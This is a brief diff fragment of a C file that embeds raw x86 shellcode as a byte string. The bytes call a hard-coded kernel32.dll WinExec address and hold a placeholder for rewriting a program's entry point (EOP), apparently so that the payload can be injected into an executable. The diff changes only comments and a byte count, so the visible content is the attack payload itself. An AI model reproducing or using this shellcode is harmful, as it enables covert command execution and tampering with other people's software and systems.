@@ -28,12 +28,12 @@ int main(int argc, char *argv[]) {
 "\x31\xC0"
 "\x50"
 "\x53"
-"\xBB\xF1\x2F\x4D\x76"; kernel32.dll WinExec
+"\xBB\xF1\x2F\x4D\x76"// kernel32.dll WinExec
 "\xFF\xD3"
 "\xBB"
 
-//19 bytes to modifiy EOP
-"\xFF\xFF\xFF\xFF" // This is the EOP
+//15 bytes to modifiy EOP
+"\xFF\xFF\xFF\xFF"
 
 "\xFF\xE3"
 "\xE8\xE8\xFF\xFF\xFF"
